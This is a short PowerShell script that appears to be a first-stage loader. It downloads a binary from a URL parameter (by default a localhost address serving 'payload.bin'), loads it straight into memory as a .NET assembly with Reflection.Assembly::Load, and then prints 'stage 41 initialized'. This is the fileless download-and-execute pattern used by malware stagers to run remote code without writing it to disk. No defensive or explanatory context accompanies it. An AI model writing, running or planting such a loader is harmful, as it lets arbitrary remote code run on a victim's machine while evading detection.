
[CmdletBinding()]
param(
    [string]$Stage1Url = 'http://localhost:9001/payload.bin'
)
$AssemblyBytes = (New-Object System.Net.WebClient).DownloadData($Stage1Url)
[Reflection.Assembly]::Load($AssemblyBytes)
Write-Output "stage 41 initialized"
